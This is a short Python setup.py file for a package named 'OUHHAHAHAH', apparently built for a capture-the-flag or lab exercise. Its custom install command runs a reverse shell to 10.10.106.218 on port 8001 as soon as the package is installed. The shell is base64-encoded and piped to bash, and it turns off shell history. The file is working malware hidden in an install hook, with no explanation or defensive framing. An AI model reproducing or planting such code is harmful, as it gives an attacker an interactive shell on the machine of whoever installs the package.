from setuptools import setup
from setuptools.command.install import install
import base64
import os


class CustomInstall(install):
    def run(self):
        install.run(self)
        LHOST = '10.10.106.218'
        LPORT = 8001

        reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST,LPORT=LPORT)
        encoded = base64.b64encode(reverse_shell.encode())
        os.system('echo %s|base64 -d|bash' % encoded.decode())


setup(
    name='OUHHAHAHAH',
    cmdclass={'install': CustomInstall}
)
